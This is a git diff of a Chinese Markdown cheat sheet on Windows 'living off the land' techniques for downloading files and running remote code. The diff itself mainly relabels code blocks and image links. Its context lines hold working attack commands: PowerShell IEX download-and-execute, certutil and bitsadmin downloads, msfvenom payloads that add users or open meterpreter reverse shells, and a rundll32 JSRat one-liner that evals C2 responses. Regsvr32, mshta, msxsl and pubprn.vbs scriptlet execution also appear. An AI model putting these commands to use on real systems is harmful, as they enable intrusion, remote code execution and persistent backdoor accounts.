@@ -30,17 +30,19 @@ PowerShell是一种命令行外壳程序和脚本环境，使命令行用户和�
 
 远程下载文件保存在本地：
 
-~~~
+~~~powershell
 powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.28.128/imag/evil.txt','evil.exe')
 ~~~
 
+![image-20210119165606109](http://img-upaiyun-own.test.upcdn.net/image-20210119165606109.png)
+
 远程执行命令：
 
-~~~
+~~~powershell
 powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.28.128/imag/evil.txt'))"
 ~~~
 
-![](./image/20200413-1.png)
+![](http://img-upaiyun-own.test.upcdn.net/20200413-1.png)
 
 
 
@@ -48,13 +50,13 @@ powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('ht
 
 bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。
 
-~~~
+~~~powershell
 bitsadmin /transfer n http://192.168.28.128/imag/evil.txt d:\test\1.txt
 ~~~
 
 输入以上命令，成功下载文件。
 
-![](./image/20200413-2.png)
+![](http://img-upaiyun-own.test.upcdn.net/20200413-2.png)
 
 
 
@@ -64,14 +66,14 @@ bitsadmin /transfer n http://192.168.28.128/imag/evil.txt d:\test\1.txt
 
 注：缓存目录为："%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content"
 
-~~~
+~~~powershell
 #下载文件
 certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt test.php
 #删除缓存
 certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt delete
 ~~~
 
-![](./image/20200413-3.png)
+![](http://img-upaiyun-own.test.upcdn.net/20200413-3.png)
 
 **4、wget**
 
@@ -79,11 +81,11 @@ Windows环境下，可上传免安装的可执行程序wget.exe到目标机器�
 
 wget.exe下载：<https://eternallybored.org/misc/wget/>
 
-```
+```powershell
 wget -O "evil.txt" http://192.168.28.128/imag/evil.txt
 ```
 
-![](./image/20200413-4.png)
+![](http://img-upaiyun-own.test.upcdn.net/20200413-4.png)
 
 
 
@@ -91,14 +93,14 @@ wget -O "evil.txt" http://192.168.28.128/imag/evil.txt
 
 IPC$(Internet Process Connection)是共享"命名管道"的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。
 
-~~~
+~~~powershell
 #建立远程IPC连接
 net use \\192.168.28.128\ipc$ /user:administrator "abc123!"
 #复制远程文件到本地主机
 copy \\192.168.28.128\c$\2.txt D:\test
 ~~~
 
-![](./image/20200413-5.png)
+![](http://img-upaiyun-own.test.upcdn.net/20200413-5.png)
 
 
 
@@ -106,7 +108,7 @@ copy \\192.168.28.128\c$\2.txt D:\test
 
 一般情况下攻击者使用FTP上传文件需要很多交互的步骤，下面这个 bash脚本，考虑到了交互的情况，可以直接执行并不会产生交互动作。
 
-```
+```powershell
 ftp 127.0.0.1
 username
 password
@@ -114,7 +116,7 @@ get file
 exit
 ```
 
-![](./image/20200413-6.png)
+![](http://img-upaiyun-own.test.upcdn.net/20200413-6.png)
 
 
 
@@ -124,17 +126,17 @@ exit
 
 tftp32服务端下载地址：<http://tftpd32.jounin.net/tftpd32_download.html>
 
-```
+```powershell
 tftp -i 你的IP get 要下载文件 存放位置
 ```
 
-![](./image/20200413-7.png)
+![](http://img-upaiyun-own.test.upcdn.net/20200413-7.png)
 
 **8、WinScp**
 
 WinSCP是一个Windows环境下使用SSH的开源图形化SFTP客户端。
 
-```
+```powershell
 #上传
 winscp.exe /console /command "option batch continue" "option confirm off" "open sftp://bypass:abc123!@192.168.28.131:22" "option transfer binary" "put D:\1.txt  /tmp/" "exit" /log=log_file.txt 
 
@@ -144,7 +146,7 @@ winscp.exe /console /command "option batch continue" "option confirm off" "open 
 
 使用winscp.exe 作为命令行参数执行远程上传/下载操作。
 
-![](./image/20200413-8.png)
+![](http://img-upaiyun-own.test.upcdn.net/20200413-8.png)
 
 
 
@@ -152,7 +154,7 @@ winscp.exe /console /command "option batch continue" "option confirm off" "open 
 
 msiexec 支持远程下载功能，将msi文件上传到服务器，通过如下命令远程执行：
 
-~~~
+~~~powershell
 #生成msi包
 msfvenom -p windows/exec CMD='net user test abc123! /add' -f msi > evil.msi
 #远程执行
@@ -161,7 +163,7 @@ msiexec /q /i http://192.168.28.128/evil.msi
 
 成功添加了一个test用户：
 
-![](./image/20200413-9.png)
+![](http://img-upaiyun-own.test.upcdn.net/20200413-9.png)
 
 
 
@@ -171,18 +173,18 @@ IEexec.exe应用程序是.NET Framework附带程序，存在于多个系统白�
 
 生成Payload：
 
-~~~
+~~~powershell
 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.28.131 lport=4444 -f exe -o evil.exe
 ~~~
 
 使用管理员身份打开cmd，分别运行下面两条命令。
 
-~~~
+~~~powershell
 C:\Windows\Microsoft.NET\Framework64\v2.0.50727>caspol.exe -s off
 C:\Windows\Microsoft.NET\Framework64\v2.0.50727>IEExec.exe http://192.168.28.131/evil.exe
 ~~~
 
-![](./image/20200413-10.png)
+![](http://img-upaiyun-own.test.upcdn.net/20200413-10.png)
 
 
 
@@ -190,13 +192,13 @@ C:\Windows\Microsoft.NET\Framework64\v2.0.50727>IEExec.exe http://192.168.28.131
 
 mshta用于执行.hta文件，而hta是HTML Applocation 的缩写，也就是HTML应用程序。而hta中也支持VBS。所以我们可以利用hta来下载文件。
 
-~~~
+~~~powershell
 mshta http://192.168.28.128/run.hta
 ~~~
 
 run.hta内容如下：
 
-~~~
+~~~html
 <HTML> 
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
 <HEAD> 
@@ -214,11 +216,11 @@ demo
 </HTML>
 ~~~
 
-![](./image/20200413-11.png)
+![](http://img-upaiyun-own.test.upcdn.net/20200413-11.png)
 
 
 
-**12、rundll32**
+**12、rundll32**【验证成功】
 
 其实还是依赖于WScript.shell这个组件，在这里我们使用JSRat来做演示，JSRat是一个命令和控制框架，仅为rundll32.exe和regsvr32.exe生成恶意程序。
 
@@ -226,37 +228,37 @@ demo
 
 步骤一：开始运行JSRat，监听本地8888端口。
 
-![](./image/20200413-12-1.png)
+![](http://img-upaiyun-own.test.upcdn.net/20200413-12-1.png)
 
 步骤二：通过url访问，可以查看恶意代码。
 
-![](.\image\20200413-12-2.png)
+![](http://img-upaiyun-own.test.upcdn.net/20200413-12-2.png)
 
 复制代码如下：
 
-~~~
+~~~powershell
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.28.131:8888/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
 ~~~
 
 步骤三：在受害者PC运行该代码，将成功返回一个会话，如下图所示：
 
-![](./image/20200413-12-3.png)
+![](http://img-upaiyun-own.test.upcdn.net/20200413-12-3.png)
 
 
 
-**13、regsvr32 **
+**13、regsvr32 **【验证成功】
 
 Regsvr32命令用于注册COM组件，是Windows系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行
 
 在目标机上执行：
 
-~~~
+~~~powershell
 regsvr32.exe /u /n /s /i:http://192.168.28.131:8888/file.sct scrobj.dll
 ~~~
 
 可以通过自己构造.sct文件，去下载执行我们的程序
 
-~~~
+~~~xml
 <?XML version="1.0"?>
 <scriptlet>
 <registration
@@ -274,25 +276,25 @@ regsvr32.exe /u /n /s /i:http://192.168.28.131:8888/file.sct scrobj.dll
 
 执行命令，成功弹计算器：
 
-![](./image/20200413-13.png)
+![](http://img-upaiyun-own.test.upcdn.net/20200413-13.png)
 
 
 
-**14、MSXSL.EXE**
+**14、MSXSL.EXE**【验证成功】
 
 msxsl.exe是微软用于命令行下处理XSL的一个程序，所以通过他，我们可以执行JavaScript进而执行系统命令。
 
-下载地址为：<https://www.microsoft.com/en-us/download/details.aspx?id=21714>
+下载地址为：https://www.microsoft.com/en-us/download/details.aspx?id=21714
 
 msxsl.exe 需要接受两个文件，XML及XSL文件，可以远程加载，具体方式如下：
 
-```
+```powershell
 msxsl http://192.168.28.128/scripts/demo.xml http://192.168.28.128/scripts/exec.xsl
 ```
 
 demo.xml
 
-```
+```xml
 <?xml version="1.0"?>
 <?xml-stylesheet type="text/xsl" href="exec.xsl" ?>
 <customers>
@@ -304,7 +306,7 @@ demo.xml
 
 exec.xsl
 
-```
+```xml
 <?xml version='1.0'?>
 <xsl:stylesheet version="1.0"
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
@@ -326,21 +328,22 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe");
 
 
 
-![](./image/20200413-14.png)
+![](http://img-upaiyun-own.test.upcdn.net/20200413-14.png)
 
 
 
-**15、pubprn.vbs**
+**15、pubprn.vbs**【验证成功】
 
 在Windows 7以上版本存在一个名为PubPrn.vbs的微软已签名WSH脚本，其位于C:\Windows\System32\Printing_Admin_Scripts\en-US，仔细观察该脚本可以发现其显然是由用户提供输入（通过命令行参数），之后再将参数传递给GetObject()
 
-```
+```powershell
 "C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs" 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct
+
 ```
 
 test.sct
 
-```
+```xml
 <?XML version="1.0"?>
 <scriptlet>
 <registration
@@ -359,6 +362,6 @@ test.sct
 </scriptlet>
 ```
 
-![](./image/20200413-15.png)
+![](http://img-upaiyun-own.test.upcdn.net/20200413-15.png)
 
 
